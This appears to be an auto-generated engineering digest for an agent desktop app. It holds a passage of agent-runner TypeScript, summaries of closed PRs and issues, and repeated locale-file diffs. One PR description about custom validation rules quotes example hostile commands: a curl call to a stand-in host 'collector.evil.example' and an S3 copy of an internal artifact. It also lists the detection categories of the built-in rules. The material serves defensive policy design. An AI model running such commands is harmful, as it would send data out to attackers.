    !anchor
    || anchor.realTokens <= 0
    || anchor.contentEpoch !== contentEpochNow
  ) {
    return { tokens: Math.round(Math.max(0, estimatedNow) * estimatorCalibration), source: "estimated" };
  }
  return {
    tokens: Math.max(0, anchor.realTokens + (estimatedNow - anchor.estimatedTokens)),
    source: "anchored",
  };
}

```

### Core Architecture Module: `src/core-agent/src/agent/runner.ts`
```
import { completedRepeatKey } from "./repeat-evidence.js";
import { fileFailureForLog } from "../tools/file-diagnostics.js";
import { toolInputDiagnostic } from "../providers/tool-input-diagnostics.js";
import { createHash, randomBytes } from "node:crypto";
import type {
  Message,
  MessageContent,
  ProviderEmptyKind,
  ProviderTerminationCategory,
  StreamEvent,
  Usage,
} from "../shared/types.js";
import {
  AuthError,
  ContextOverflowError,
  classifyRetryableError,
  isProviderRateLimitError,
  isRetryableError,
  providerHttpStatusOf,
  TimeoutError,
  SessionPersistenceError,
  isToolResultPersistenceError,
  errorCodeForLog,
  formatError,
} from "../shared/errors.js";
import { createLogger } from "../shared/logger.js";
import type { CoreAgentConfig } from "../config/schema.js";
import type { EvolutionConfig } from "../evolution/types.js";
import type {
  LLMProvider,
  CompletionParams,
  CompletionResult,
  ToolDefinition,
} from "../providers/base.js";
import { ProviderRegistry } from "../providers/registry.js";
import type {
  AgentTool,
  ToolContext,
  ToolProgress,
  ToolResult,
} from "../tools/base.js";
import { toToolDefinition, toolCallIsParallel } from "../tools/base.js";
import { getBuiltinTools } from "../tools/builtin.js";
import { createExecutionPlanTool } from "../tools/execution-plan.js";
import {
  createRunProgramTool,
  markProgrammaticToolCallState,
  RUN_PROGRAM_TOOL_NAME,
  type ProgrammaticToolAuthorization,
  type ProgrammaticToolInvokeOutcome,
  type ProgrammaticToolPolicy,
  type ProgramSourceLoader,
} from "../tools/run-program.js";
import { WORKSPACE_DIFF_PROVIDER_STATE_KEY } from "../tools/workspace-diff.js";
import { renderToolFileChanges, toolFileChangeFacts } from "./workspace-state.js";
import {
  LoopGuards,
  LOOP_WARN,
  LOOP_HARD,
  NEAR_DUP_LOOP_WARN,
  RUN_NO_PROGRESS_NUDGE_ROUNDS,
  RUN_DISCOVERY_NUDGE_ROUNDS,
  DISCOVERY_ONLY_TOOLS,
  mergeToolRoundProgress,
  toolCallSignature,
  normalizedToolCallSignature,
  type ToolRoundProgress,
} from "./loop-guards.js";
// Spin-guard thresholds and signatures moved to ./loop-guards.ts with the
// LoopGuards extraction; re-exported here so existing imports (tests, hosts)
// keep working unchanged.
export {
  LOOP_WARN,
  LOOP_HARD,
  NEAR_DUP_LOOP_WARN,
  RUN_NO_PROGRESS_NUDGE_ROUNDS,
  RUN_DISCOVERY_NUDGE_ROUNDS,
  toolCallSignature,
  normalizedToolCallSignature,
} from "./loop-guards.js";
import { ProgressEvidence } from "./progress-evidence.js";
import { SkillStore } from "../evolution/skill-store.js";
import { createSkillManageTool } from "../evolution/skill-tools.js";
import { REFLECTION_SYSTEM_PROMPT } from "../evolution/metacognition.js";
import {
  ACTIVE_CHECKPOINT_EXACT_FACTS_HEADING,
  CONTEXT_COMPACTION_SUMMARY_HARD_TOKENS,
  CONTEXT_COMPACTION_SUMMARY_PREFERRED_MAX_TOKENS,
  HISTORY_EXACT_FACTS_HEADING,
  Session,
  boundStructuredSummaryTokens,
  estimateTextTokens,
  mergeUsage,
} from "./session.js";
import {
  DEFAULT_CONTEXT_BUDGET,
  MAX_PER_RESULT_INLINE_TOKENS,
  MAX_VERBATIM_DOCUMENT_INLINE_TOKENS,
  contextBudget,
  type ContextBudget,
  MAX_ACTIVE_CHECKPOINT_INPUT_TOKENS,
} from "./context-budget.js";
import {
  anchoredRequestTokens,
  usageRequestFootprintTokens,
  type RequestTokenAnchor,
} from "./request-token-anchor.js";
import type {
  AgentRunParams,
  AgentRunResult,
  AgentRunMeta,
  AgentRunEvent,
  AgentRunTimings,
  AgentRunConvergenceSignal,
  AgentRunTermination,
  AgentRunSteerInput,
  AgentRunSteerMessage,
} from "./types.js";
import { discoverRepositoryInstructions, repositoryInstructionsText } from "./repository-instructions.js";

const log = createLogger("agent-runner");
const RETRY_BASE_DELAY_MS = 1_000;
const RETRY_MAX_DELAY_MS = 30_000;
const RETRY_JITTER_RATIO = 0.2;
const TOOL_HEARTBEAT_TIMEOUT_GRACE_MS = 30_000;
const LEGACY_COMPACTED_TOOL_USE_INPUT_KEY = "__orkas_compacted_tool_use";
const STOPPED_RUN_SUMMARY_MAX_TOKENS = 1_200;
export const RUN_CONVERGENCE_SOFT_RATIO = 0.8;
export const RUN_CONVERGENCE_ELAPSED_MS = 8 * 60 * 1000;
export const RUN_CONVERGENCE_MIN_TOOL_LOOPS = 8;
export const SLOW_COMPACTION_CONVERGENCE_MS = 2 * 60 * 1000;

export interface ReflectionModelCallEvent {
  model: string;
  stopReason: string;
  usage: Usage;
  toolCallCount: number;
  durationMs: number;
}

/**
 * Why `runReflection` came back without a final reply. Every failure inside
 * the loop collapses to `''` so the orchestrator can treat it uniformly; this
 * observer is the only way the host learns which one it was.
 *
 *   - `no_provider`   no provider resolved for the agent's default model
 *   - `llm_error`     the model call threw (provider, network, cooldown)
 *   - `max_loops`     five tool rounds without a final reply
 *   - `empty_output`  the model ended normally with no text and no tool call
 */
export interface ReflectionFailure {
  kind: 'no_provider' | 'llm_error' | 'max_loops' | 'empty_output';
  error?: unknown;
  stopReason?: string;
}

/**
 * Tool calls that leave something behind after a reflection ends. The review
 * prompt tells the model to answer "nothing to save" when a window holds no
 * new lesson, so a non-empty response proves only that the model replied —
 * the host cannot tell restraint from a real update without knowing whether
 * one of these ran. `read`/`list` are excluded: they are how a reflection
 * gathers context before deciding.
 */
const REFLECTION_WRITE_ACTIONS: Record<string, readonly string[]> = {
  metacognition: ['write'],
  skill_manage: ['create', 'patch', 'delete'],
};

function isReflectionDurableWrite(toolName: string, input: unknown): boolean {
  const actions = REFLECTION_WRITE_ACTIONS[toolName];
  if (!actions) return false;
  const action = (input as { action?: unknown } | null)?.action;
  return typeof action === 'string' && actions.includes(action);
}

/**
 * Stop attempting LLM-backed compaction after this many failures in a row.
 *
 * There is deliberately NO cap on how many times a run may compact
 * successfully. A per-run ceiling existed twice before and failed the same way
 * both times: once it is reached, context can only grow, the inline result
 * allowance shrinks to zero, and the agent keeps calling tools whose output it
 * can no longer see — with no error until the request finally overflows. The
 * ceiling was raised the first time (fixed 3 -> scaled with the tool budget)
 * rather than questioned; scaling only moved the cliff.
 *
 * What actually needs bounding is wasted work, and the precise guards for that
 * are elsewhere: `attemptedFingerprints` refuses to compact identical state
 * twice, and applied summaries must free context. Neither is a function of
 * how long the task runs. A consecutive-failure
 * streak is the same kind of quantity: it says compaction is not working right
 * now, and it says nothing about task length.
 */
export const MAX_CONSECUTIVE_COMPACTION_FAILURES = 3;

/** Compound "may be spinning after context loss" signal: at least this many
 *  compactions AND this fraction of the tool-loop budget consumed in one run.
 *  Distinct from the near-limit finish-up nudge — it fires only when repeated
 *  compaction co-occurs with heavy tool use (the post-compaction spin
 *  fingerprint), nudging the model once to re-anchor on its durable state
 *  instead of re-deriving work lost to summarization. Benign on a legitimately
 *  long run: it prompts a DONE/REMAINING check and convergence, never aborts. */
export const SPIN_CONVERGENCE_MIN_COMPACTIONS = 2;
export const SPIN_CONVERGENCE_TOOL_LOOP_RATIO = 0.75;
export const TOOL_RESULT_MARKER_RESERVE_TOKENS = 1_000;
/** The one margin between a measured request and the model's usable input.
 *  It covers the local estimator's absolute error and the provider's own
 *  message framing together; the fixed 2,048-token safety and 256-token
 *  structure reserves that used to sit beside it were both smaller than this
 *  margin on every window that can run an agent turn, so they only ever
 *  moved the same line a second time. A per-tool-call marker reserve remains
 *  separate because it scales with the number of results, not the request. */
const CONTEXT_COMPACTION_TRIGGER_RATIO = 0.82;
/** Context summaries are streamed internally. A candidate may rotate only
 * when it has produced no usable content for 60 s; after the first content
 * event the stream is committed to that candidate. A committed stream may be
 * silent for at most 60 s, while all summary work in one pre-model compaction
 * phase shares a ten-minute wall-clock budget. */
export const CONTEXT_COMPACTION_FIRST_EVENT_TIMEOUT_MS = 60 * 1000;
export const CONTEXT_COMPACTION_IDLE_TIMEOUT_MS = 60 * 1000;
export const CONTEXT_COMPACTION_TIMEOUT_MS = 10 * 60 * 1000;
export const CONTEXT_COMPACTION_IDLE_TIMEOUT_CODE = "CONTEXT_COMPACTION_IDLE_TIMEOUT";
export const CONTEXT_COMPACTION_TIMEOUT_CODE = "CONTEXT_COMPACTION_TIMEOUT";
export const CONTEXT_COMPACTION_EMPTY_SUMMARY_CODE = "CONTEXT_COMPACTION_EMPTY_SUMMARY";

class ContextCompactionIdleTimeoutError extends Error {
  readonly code = CONTEXT_COMPACTION_IDLE_TIMEOUT_CODE;

  constructor(timeoutMs: number) {
    super(`Context compaction produced no new content for ${Math.max(1, Math.round(timeoutMs))}ms`);
    this.name = "ContextCompactionIdleTimeoutError";
  }
}

class ContextCompactionTimeoutError extends Error {
  readonly code = CONTEXT_COMPACTION_TIMEOUT_CODE;

  constructor(timeoutMs: number) {
    super(`Context compaction did not complete within ${Math.max(1, Math.round(timeoutMs))}ms`);
    this.name = "ContextCompactionTimeoutError";
  }
}

class ContextCompactionEmptySummaryError extends Error {
  readonly code = CONTEXT_COMPACTION_EMPTY_SUMMARY_CODE;

  constructor(message: string) {
    super(message);
    this.name = "ContextCompactionEmptySummaryError";
  }
}

/**
 * Context summarization is an auxiliary data-transformation call, not another
 * agent turn. Keep its authority boundary explicit and small: the full agent
 * p
```


### D2: Asynchronous State & Concurrency
- Analyzed concurrency guarantees, async pipelines, and event handling from PR resolutions and commit changes.

### D3: Error Boundaries, Recovery & Rollbacks
- Exception handling patterns and defect resolutions extracted from closed production bug issues:
- **Issue #101** (2026-10-03): **fix(i18n): simplify CLI badges and complete validation translations**
  *Symptoms*: CLI Agent cards now show only the CLI brand name in all 19 UI languages, with a concise fallback when a label is unavailable.  Also completes the eight existing custom-validation messages omitted from 17 locales. The missing keys already failed the locale resource contract on `main`; this repair preserves the test contract and custom-policy behavior. The two fixes are separate commits.  Validation: - 144 focused tests passed across locale contracts, Agent cards, Settings and core workflows. The baseline had 120 passes and one locale-key failure, now repaired. - Checked 95 locale/brand outputs and four missing-label fallbacks; the old badge output fails the brand-only check. - Main/core-agent typechecks, isolated smoke, renderer syntax and diff checks passed. Local test logs contain no warnings or errors. - Source-boundary checks found no forbidden files/symbols, provider changes, orphan imports, UI/package regressions or built-in resource drift. The broader cross-repository inventory gate remains deferred (16 pending copies and 82 adaptations); this limited PR does not establish full source parity or release readiness. 

- **Issue #100** (2026-10-02): **Harden and connect operator quality policies (follow-up to #97)**
  *Symptoms*: ## Problem and result  Companion to #97 (refs #23). Operator regexes currently run synchronously, malformed policy files can silently load only some rules, and operator findings can receive unrelated built-in repair hints. The rules are also not connected to desktop write/install flows.  This follow-up adds bounded Worker execution, atomic configuration rejection, `operator:` finding IDs, source-aware display, and an opt-in **Settings → General → Custom validation** entry. Rules live in the current account's device-local `operator-policy.json`; the switch defaults to off. Enabled policy failures block writes and cannot be bypassed with install/import force. Users can fix the file or disable the policy to recover.  Agent create/update, Skill authoring and metadata changes, local directory/ZIP import, Marketplace installs and bundled Agent-private Skills use the coordinator. Imports validate staged content before publication. Async Skill validation checks cancellation/account ownership before committing; Agent saves retain their existing initiating-account contract. Built-in-only validation and override behavior remain compatible.  The original PR's scan scope is retained: scripts, executable SKILL.md fences, selected metadata and serialized Agent JSON. This is not a runtime sandbox or a retroactive installed-resource audit. Global/package discovery, sync and runtime-generated learned Skills remain outside this feature. Settings are host-only, with no new model tool or Web SDK 

- **Issue #99** (2026-10-02): **fix(agents): keep Japanese default and suggested names valid**
  *Symptoms*: Japanese users could create an Agent with the localized default name but could not save it afterward because the name contains characters rejected by the existing name and mention contract. The input hint suggested another rejected name.  Use `名称未設定` as the default and `例: SNS担当` as the hint. Extend the existing locale regression to verify creation, saving, renaming, and persisted names in Japanese. Existing names and validation rules are unchanged.  Validation: 303 tests passed across Agents, main and renderer i18n, and name handling; both typechecks and isolated smoke passed. The Japanese regression fails against the previous locale values. Only two locale values and one test row change. 

- **Issue #98** (2026-10-01): **Expand connectors and local project workflows with desktop fixes**
  *Symptoms*: ## Summary  Expand merchant connector APIs, authorization and bounded tool discovery; improve local projects, conversation filing, desktop navigation and runtime validation.  Keep project collaboration as a visible invitation entry with commercial membership guidance. Local project navigation remains quiet, settings permission options stay aligned, and category caches retain valid data during concurrent refreshes or failed writes. Hosted accounts, collaboration state, cloud sync and private telemetry remain excluded.  ## Validation  - Full pre-cache baseline: 15,721 JavaScript cases, 613 Python cases plus 198 subtests, and 355 desktop scenarios passed. - Final relevant verification: 3,735 cases passed / 3 platform skips; 7 cache consumer desktop scenarios passed. Both cache owning suites passed 9 cases after failing old-code negative controls. - Main/core and E2E typechecks, isolated smoke and fixed-range OSS boundary checks passed. - Current main merged with an identical resulting tree; 36 Library-picker and CLI-entry regression cases passed again.  ## Verification limits  Local native execution was macOS only; PR CI additionally passed native dependency checks on Linux x64/arm64, Windows and both macOS architectures. Earlier native owner-window destruction passed unchanged replay but its original cause remains unresolved. Full-run GPU mailbox and missing live-row diagnostics remain unexplained; ordinary resource CRUD does not verify successful background model authoring. Th

- **Issue #97** (2026-10-02): **feat(quality): allow operator-supplied red-flag rules**
  *Symptoms*: ## Summary  Fixes #23.  `src/main/quality` is the static gate that runs before a SKILL.md or agent.json is written. Its own README says user-defined red flags are not exposed and the rule list is build-time only, so any team policy needs a fork: edit `rules/red-flags.ts`, add a fixture, bump `VALIDATOR_VERSION`.  This adds an operator-supplied rule file that merges into the same validation report. The built-in list stays the unchanged security floor.  ## Use case  Our policy is *"skills must never touch the internal artifact bucket"* and *"skill scripts may only curl hosts on an allowlist"*. Neither is enforceable today: a skill running `aws s3 cp s3://acme-internal/model.bin .` or `curl -fsS https://collector.evil.example/x` passes validation cleanly, because the built-in rules only cover credential files, `eval`, `curl | bash`, persistence, and so on. Adding two regexes currently means forking Orkas.  Note this is a gate on **spec content**, not a sandbox — runtime path-sandboxing and permission gates remain the enforcement layer.  ```json {   "version": 1,   "rules": [     {       "id": "no_internal_bucket",       "level": "EXTREME",       "pattern": "s3://acme-internal",       "message": "Internal buckets are off limits for skills.",       "appliesTo": ["script", "skill_md"]     }   ] } ```  | field | required | notes | |---|---|---| | `id` | yes | `[a-z0-9][a-z0-9_.-]{0,63}`, must not collide with a built-in id | | `level` | yes | `EXTREME` / `MEDIUM` / `LOW` | | `patter
  **Post-Mortem & Fix Analysis**:
  > 感谢 @Harbor404 为 Orkas 带来自定义质量校验能力！#97 已与后续完善的 #100 一并合入。你的规则解析、追加校验和来源标记设计，为这项功能打下了良好基础。感谢你的贡献，期待后续继续交流与合作！ 

- **Issue #96** (2026-10-01): **fix(chat): reposition Library picker after async loading**
  *Symptoms*: When Library files finish loading, the picker can grow below its original position and cover the composer. Route the deferred repaint through the shared positioning helper so the loaded list stays within the available space, while retaining the current search and closed/switched-tab guards.  Adds four regression cases for placement, search, closing, and switching tabs. Also removes a stale telemetry-helper load from the CLI-entry test fixture; its existing interaction assertions are unchanged.  Validation: - Two new placement cases reproduce the overlap before the fix; all 68 related renderer tests pass afterward. - Main and core-agent type checks pass. - The real Electron composer/Library tab test passes. - JavaScript syntax and whitespace checks pass.  No dependencies, provider behavior, or hosted services are changed. Full-suite and cross-platform results are separate from these focused local checks. 

- **Issue #95** (2026-09-30): **fix(preview): keep private file details out of failure logs**
  *Symptoms*: File-preview failure handlers could write full local paths and raw exception messages to diagnostic logs. Replace those values with fixed error codes for file checks, text reads, folder reveals, app inspection, and editor teardown. Existing prompts, fallback actions, and cleanup behavior are preserved.  Validation: - 119 tests across eight related renderer suites pass. Six new privacy/recovery cases fail against the original implementation and pass with this change. - Main and core-agent typechecks, JavaScript syntax, diff checks, and isolated smoke pass. - Smoke retains the existing Node DEP0205 deprecation warning.  Only the shared preview module and its tests change. Commercial account services, sharing, telemetry, provider policy, dependencies, and platform-specific code are untouched. The wider synchronization inventory remains deferred due to existing project-invite UI and resource/code inventory differences; its baseline is unchanged. No release is requested. 

- **Issue #93** (2026-09-29): **fix(local-agents): exclude system sleep from CLI idle time**
  *Symptoms*: When the computer sleeps during a local CLI Agent run, the idle watchdog can count sleep as inactivity and terminate the process immediately after wake. Measure CLI inactivity using the shared OS suspend/resume clock so the remaining idle allowance survives sleep.  Preserve the 24-hour wall-clock deadline, immediate cancellation, nested approval waits, real-progress renewal, and wall-clock fallback when power monitoring is unavailable. One shared listener pair serves all runs; no new polling or dependencies.  Validation: - Before the change: 206 related tests passed. New regression cases reproduced premature termination on the old implementation. - After the change: 215 tests across 10 runner, watchdog, OS clock, and CLI backend suites passed; both TypeScript checks and isolated smoke passed. - Fault-injection logs were reviewed; the smoke run retains an existing Node `module.register()` deprecation warning. - OS events were simulated deterministically on macOS; physical sleep/wake and native Windows sleep were not exercised.  CI: all seven Linux source and native dependency jobs succeeded. Existing Sharp/Electron Linux compatibility warnings and GLib diagnostics match the preceding PR in signature and count; dependency/action deprecations remain. Both GUI log collectors report 11 classified D-Bus warnings and zero unexpected diagnostics. 

### D4: Resource Lifecycle & Leak Defenses
- Memory allocation, socket lifecycle, and handle cleanup observed from bug fixes and PR deltas.

### D5: Boundary Deserialization & Encoding
- Schema deserialization, payload validation, and untrusted input guards.

### D6: Cross-Platform & Runtime Gotchas
- Platform variance, OS-specific gotchas, and environment discrepancies detected in issue reports.

### D7: Build, CI/CD, Deployment & Tooling
- Toolchain requirements, dependencies, and packaging specs verified against remote manifests.

### D8: Forensic Bug Fixes & Real Production Code Patches
Observed empirical fixes and code patches:

### Incident Patch 1: `59535899` (2026-10-03)
**Commit Message**: Merge pull request #101 from BlueSkyID666/codex/fix-cli-badges-20261003

fix(i18n): simplify CLI badges and complete validation translations

**File**: `src/main/locales/ar.json` (modified, +2/-1)
```diff
@@ -280,5 +280,6 @@
   "sync.conflict_resolution.title_single": "حل تعارض مزامنة السحابة: {name}",
   "sync.conflict_resolution.title_batch": "حل تعارض مزامنة السحابة: {count} تعارض",
   "sync.conflict_resolution.message_single": "يرجى مساعدتي في حل تعارض مزامنة السحابة هذا.",
-  "sync.conflict_resolution.message_batch": "يرجى مساعدتي في حل تعارضات مزامنة السحابة هذه."
+  "sync.conflict_resolution.message_batch": "يرجى مساعدتي في حل تعارضات مزامنة السحابة هذه.",
+  "quality.operator.incomplete": "لم يكتمل التحقق المخصص. أصلح ملف القواعد أو أوقف التحقق المخصص في الإعدادات، ثم أعد المحاولة."
 }
```

**File**: `src/main/locales/de.json` (modified, +2/-1)
```diff
@@ -280,5 +280,6 @@
   "sync.conflict_resolution.title_single": "Cloud-Synchronisierungskonflikt lösen: {name}",
   "sync.conflict_resolution.title_batch": "Cloud-Synchronisierungskonflikte lösen: {count}",
   "sync.conflict_resolution.message_single": "Bitte helfen Sie mir, diesen Cloud-Synchronisierungskonflikt zu lösen.",
-  "sync.conflict_resolution.message_batch": "Bitte helfen Sie mir, diese Cloud-Synchronisierungskonflikte zu lösen."
+  "sync.conflict_resolution.message_batch": "Bitte helfen Sie mir, diese Cloud-Synchronisierungskonflikte zu lösen.",
+  "quality.operator.incomplete": "Die benutzerdefinierte Validierung wurde nicht abgeschlossen. Korrigieren Sie die Regeldatei oder deaktivieren Sie die benutzerdefinierte Validierung in den Einstellungen und versuchen Sie es erneut."
 }
```

**File**: `src/main/locales/es-419.json` (modified, +2/-1)
```diff
@@ -280,5 +280,6 @@
   "sync.conflict_resolution.title_single": "Resolver conflicto de sincronización en la nube: {name}",
   "sync.conflict_resolution.title_batch": "Resolver conflictos de sincronización en la nube: {count}",
   "sync.conflict_resolution.message_single": "Ayúdame a resolver este conflicto de sincronización en la nube.",
-  "sync.conflict_resolution.message_batch": "Ayúdame a resolver estos conflictos de sincronización en la nube."
+  "sync.conflict_resolution.message_batch": "Ayúdame a resolver estos conflictos de sincronización en la nube.",
+  "quality.operator.incomplete": "La validación personalizada no se completó. Corrige el archivo de reglas o desactiva la validación personalizada en Configuración y vuelve a intentarlo."
 }
```

**File**: `src/main/locales/es.json` (modified, +2/-1)
```diff
@@ -280,5 +280,6 @@
   "sync.conflict_resolution.title_single": "Resolver conflicto de sincronización en la nube: {name}",
   "sync.conflict_resolution.title_batch": "Resolver conflictos de sincronización en la nube: {count}",
   "sync.conflict_resolution.message_single": "Ayúdame a resolver este conflicto de sincronización en la nube.",
-  "sync.conflict_resolution.message_batch": "Ayúdame a resolver estos conflictos de sincronización en la nube."
+  "sync.conflict_resolution.message_batch": "Ayúdame a resolver estos conflictos de sincronización en la nube.",
+  "quality.operator.incomplete": "La validación personalizada no se ha completado. Corrige el archivo de reglas o desactiva la validación personalizada en Ajustes e inténtalo de nuevo."
 }
```

**File**: `src/main/locales/fr.json` (modified, +2/-1)
```diff
@@ -280,5 +280,6 @@
   "sync.conflict_resolution.title_single": "Résoudre un conflit de synchronisation cloud : {name}",
   "sync.conflict_resolution.title_batch": "Résoudre les conflits de synchronisation cloud : {count}",
   "sync.conflict_resolution.message_single": "Aidez-moi à résoudre ce conflit de synchronisation cloud.",
-  "sync.conflict_resolution.message_batch": "Aidez-moi à résoudre ces conflits de synchronisation cloud."
+  "sync.conflict_resolution.message_batch": "Aidez-moi à résoudre ces conflits de synchronisation cloud.",
+  "quality.operator.incomplete": "La validation personnalisée n’a pas abouti. Corrigez le fichier de règles ou désactivez la validation personnalisée dans les paramètres, puis réessayez."
 }
```

**File**: `src/main/locales/hi.json` (modified, +2/-1)
```diff
@@ -280,5 +280,6 @@
   "sync.conflict_resolution.title_single": "क्लाउड सिंक टकराव का समाधान: {name}",
   "sync.conflict_resolution.title_batch": "क्लाउड सिंक टकराव का समाधान: {count} टकराव",
   "sync.conflict_resolution.message_single": "इस क्लाउड सिंक टकराव को सुलझाने में मेरी मदद करें।",
-  "sync.conflict_resolution.message_batch": "इन क्लाउड सिंक टकरावों को सुलझाने में मेरी मदद करें।"
+  "sync.conflict_resolution.message_batch": "इन क्लाउड सिंक टकरावों को सुलझाने में मेरी मदद करें।",
+  "quality.operator.incomplete": "कस्टम सत्यापन पूरा नहीं हुआ। नियम फ़ाइल ठीक करें या सेटिंग में कस्टम सत्यापन बंद करके फिर कोशिश करें।"
 }
```

**File**: `src/main/locales/id.json` (modified, +2/-1)
```diff
@@ -280,5 +280,6 @@
   "sync.conflict_resolution.title_single": "Resolusi konflik sinkronisasi cloud: {name}",
   "sync.conflict_resolution.title_batch": "Resolusi konflik sinkronisasi cloud: konflik {count}",
   "sync.conflict_resolution.message_single": "Tolong bantu saya menyelesaikan konflik sinkronisasi cloud ini.",
-  "sync.conflict_resolution.message_batch": "Tolong bantu saya menyelesaikan konflik sinkronisasi cloud ini."
+  "sync.conflict_resolution.message_batch": "Tolong bantu saya menyelesaikan konflik sinkronisasi cloud ini.",
+  "quality.operator.incomplete": "Validasi kustom tidak selesai. Perbaiki file aturan atau nonaktifkan validasi kustom di Pengaturan, lalu coba lagi."
 }
```

**File**: `src/main/locales/it.json` (modified, +2/-1)
```diff
@@ -280,5 +280,6 @@
   "sync.conflict_resolution.title_single": "Risolvi il conflitto di sincronizzazione cloud: {name}",
   "sync.conflict_resolution.title_batch": "Risolvi i conflitti di sincronizzazione cloud: {count}",
   "sync.conflict_resolution.message_single": "Aiutami a risolvere questo conflitto di sincronizzazione cloud.",
-  "sync.conflict_resolution.message_batch": "Aiutami a risolvere questi conflitti di sincronizzazione cloud."
+  "sync.conflict_resolution.message_batch": "Aiutami a risolvere questi conflitti di sincronizzazione cloud.",
+  "quality.operator.incomplete": "La validazione personalizzata non è stata completata. Correggi il file delle regole o disattiva la validazione personalizzata nelle impostazioni, quindi riprova."
 }
```

---

### Incident Patch 2: `478c696c` (2026-10-03)
**Commit Message**: fix(i18n): complete custom validation translations

Fill eight existing custom-validation messages in the 17 locales missing them. Preserve English and Chinese copy, policy execution and all existing translation values.

The unchanged locale-contract test failed on main before this repair. All 144 selected locale, card, settings and core cases now pass, along with main/core-agent typechecks and isolated smoke. No assertions or runtime policy behavior changed.

**File**: `src/main/locales/ar.json` (modified, +2/-1)
```diff
@@ -280,5 +280,6 @@
   "sync.conflict_resolution.title_single": "حل تعارض مزامنة السحابة: {name}",
   "sync.conflict_resolution.title_batch": "حل تعارض مزامنة السحابة: {count} تعارض",
   "sync.conflict_resolution.message_single": "يرجى مساعدتي في حل تعارض مزامنة السحابة هذا.",
-  "sync.conflict_resolution.message_batch": "يرجى مساعدتي في حل تعارضات مزامنة السحابة هذه."
+  "sync.conflict_resolution.message_batch": "يرجى مساعدتي في حل تعارضات مزامنة السحابة هذه.",
+  "quality.operator.incomplete": "لم يكتمل التحقق المخصص. أصلح ملف القواعد أو أوقف التحقق المخصص في الإعدادات، ثم أعد المحاولة."
 }
```

**File**: `src/main/locales/de.json` (modified, +2/-1)
```diff
@@ -280,5 +280,6 @@
   "sync.conflict_resolution.title_single": "Cloud-Synchronisierungskonflikt lösen: {name}",
   "sync.conflict_resolution.title_batch": "Cloud-Synchronisierungskonflikte lösen: {count}",
   "sync.conflict_resolution.message_single": "Bitte helfen Sie mir, diesen Cloud-Synchronisierungskonflikt zu lösen.",
-  "sync.conflict_resolution.message_batch": "Bitte helfen Sie mir, diese Cloud-Synchronisierungskonflikte zu lösen."
+  "sync.conflict_resolution.message_batch": "Bitte helfen Sie mir, diese Cloud-Synchronisierungskonflikte zu lösen.",
+  "quality.operator.incomplete": "Die benutzerdefinierte Validierung wurde nicht abgeschlossen. Korrigieren Sie die Regeldatei oder deaktivieren Sie die benutzerdefinierte Validierung in den Einstellungen und versuchen Sie es erneut."
 }
```

**File**: `src/main/locales/es-419.json` (modified, +2/-1)
```diff
@@ -280,5 +280,6 @@
   "sync.conflict_resolution.title_single": "Resolver conflicto de sincronización en la nube: {name}",
   "sync.conflict_resolution.title_batch": "Resolver conflictos de sincronización en la nube: {count}",
   "sync.conflict_resolution.message_single": "Ayúdame a resolver este conflicto de sincronización en la nube.",
-  "sync.conflict_resolution.message_batch": "Ayúdame a resolver estos conflictos de sincronización en la nube."
+  "sync.conflict_resolution.message_batch": "Ayúdame a resolver estos conflictos de sincronización en la nube.",
+  "quality.operator.incomplete": "La validación personalizada no se completó. Corrige el archivo de reglas o desactiva la validación personalizada en Configuración y vuelve a intentarlo."
 }
```

**File**: `src/main/locales/es.json` (modified, +2/-1)
```diff
@@ -280,5 +280,6 @@
   "sync.conflict_resolution.title_single": "Resolver conflicto de sincronización en la nube: {name}",
   "sync.conflict_resolution.title_batch": "Resolver conflictos de sincronización en la nube: {count}",
   "sync.conflict_resolution.message_single": "Ayúdame a resolver este conflicto de sincronización en la nube.",
-  "sync.conflict_resolution.message_batch": "Ayúdame a resolver estos conflictos de sincronización en la nube."
+  "sync.conflict_resolution.message_batch": "Ayúdame a resolver estos conflictos de sincronización en la nube.",
+  "quality.operator.incomplete": "La validación personalizada no se ha completado. Corrige el archivo de reglas o desactiva la validación personalizada en Ajustes e inténtalo de nuevo."
 }
```

**File**: `src/main/locales/fr.json` (modified, +2/-1)
```diff
@@ -280,5 +280,6 @@
   "sync.conflict_resolution.title_single": "Résoudre un conflit de synchronisation cloud : {name}",
   "sync.conflict_resolution.title_batch": "Résoudre les conflits de synchronisation cloud : {count}",
   "sync.conflict_resolution.message_single": "Aidez-moi à résoudre ce conflit de synchronisation cloud.",
-  "sync.conflict_resolution.message_batch": "Aidez-moi à résoudre ces conflits de synchronisation cloud."
+  "sync.conflict_resolution.message_batch": "Aidez-moi à résoudre ces conflits de synchronisation cloud.",
+  "quality.operator.incomplete": "La validation personnalisée n’a pas abouti. Corrigez le fichier de règles ou désactivez la validation personnalisée dans les paramètres, puis réessayez."
 }
```

**File**: `src/main/locales/hi.json` (modified, +2/-1)
```diff
@@ -280,5 +280,6 @@
   "sync.conflict_resolution.title_single": "क्लाउड सिंक टकराव का समाधान: {name}",
   "sync.conflict_resolution.title_batch": "क्लाउड सिंक टकराव का समाधान: {count} टकराव",
   "sync.conflict_resolution.message_single": "इस क्लाउड सिंक टकराव को सुलझाने में मेरी मदद करें।",
-  "sync.conflict_resolution.message_batch": "इन क्लाउड सिंक टकरावों को सुलझाने में मेरी मदद करें।"
+  "sync.conflict_resolution.message_batch": "इन क्लाउड सिंक टकरावों को सुलझाने में मेरी मदद करें।",
+  "quality.operator.incomplete": "कस्टम सत्यापन पूरा नहीं हुआ। नियम फ़ाइल ठीक करें या सेटिंग में कस्टम सत्यापन बंद करके फिर कोशिश करें।"
 }
```

**File**: `src/main/locales/id.json` (modified, +2/-1)
```diff
@@ -280,5 +280,6 @@
   "sync.conflict_resolution.title_single": "Resolusi konflik sinkronisasi cloud: {name}",
   "sync.conflict_resolution.title_batch": "Resolusi konflik sinkronisasi cloud: konflik {count}",
   "sync.conflict_resolution.message_single": "Tolong bantu saya menyelesaikan konflik sinkronisasi cloud ini.",
-  "sync.conflict_resolution.message_batch": "Tolong bantu saya menyelesaikan konflik sinkronisasi cloud ini."
+  "sync.conflict_resolution.message_batch": "Tolong bantu saya menyelesaikan konflik sinkronisasi cloud ini.",
+  "quality.operator.incomplete": "Validasi kustom tidak selesai. Perbaiki file aturan atau nonaktifkan validasi kustom di Pengaturan, lalu coba lagi."
 }
```

**File**: `src/main/locales/it.json` (modified, +2/-1)
```diff
@@ -280,5 +280,6 @@
   "sync.conflict_resolution.title_single": "Risolvi il conflitto di sincronizzazione cloud: {name}",
   "sync.conflict_resolution.title_batch": "Risolvi i conflitti di sincronizzazione cloud: {count}",
   "sync.conflict_resolution.message_single": "Aiutami a risolvere questo conflitto di sincronizzazione cloud.",
